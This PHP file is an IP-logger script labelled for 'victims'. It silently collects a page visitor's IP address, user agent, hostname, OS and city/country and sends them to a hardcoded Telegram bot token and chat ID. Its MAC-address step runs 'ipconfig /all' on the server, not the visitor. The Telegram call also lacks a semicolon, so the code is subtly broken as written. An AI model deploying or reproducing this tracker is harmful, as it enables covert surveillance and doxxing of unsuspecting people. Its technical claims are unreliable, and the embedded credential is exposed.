<?php

error_reporting(0);
//Bot Token + UserID

$bot_token = "854979584:AAGigxt4fyVv0Cp2XZPMk3Ukr-ycTZB-SgU";
$userid = "698678627";


ob_start();
system('ipconfig /all');
$mycomsys=ob_get_contents();
ob_clean();
$find_mac = "Physical";
$pmac = strpos($mycomsys, $find_mac);
$macaddress=substr($mycomsys,($pmac+36),17);


 $user = $_SERVER['HTTP_USER_AGENT'];

 function getOS() {
    global $user;
    $os_platform    =   "Unknown OS Platform";
    $os_array       =   array(
                            '/windows nt 10/i'     =>  'Windows 10',
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
							'/kalilinux/i'          =>  'KaliLinux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile',
							'/Windows Phone/i'      =>  'Windows Phone'
                        );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user)) {
            $os_platform    =   $value;
        }
    }
    return $os_platform;
}

    $os = getOS();

 function RealIp() {
  if (!empty($_SERVER['HTTP_CLIENT_IP']))
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  else
    $ip = $_SERVER['REMOTE_ADDR'];
  return $ip;
 }

  $data=RealIp();

  $isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);



$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$data"));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"];


 $textmsg="
 ---------+--------
 Your Victim Ip==> <code>$data</code>
 ---------+--------
 Your Victim MACAddress==> <code>$macaddress</code>
 ---------+--------
 Your Victim PC Name==> <code>$user</code>
 ---------+--------
 Your Victim Hostname==> <code>$isp</code>
 ---------+--------
 Your Victim OS==> <code>$os</code>
 ---------+--------
 Your Victim Country=> <code>$country</code>
 ---------+--------
 Your Victim City==> <code>$city</code>
 ---------+--------
 Created By @LiosionWEB
 ---------+--------
  ";





file_get_contents_curl("https://api.telegram.org/bot$bot_token/SendMessage?parse_mode=HTML&chat_id=$userid&text=".urlencode($textmsg))

function file_get_contents_curl($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
?>
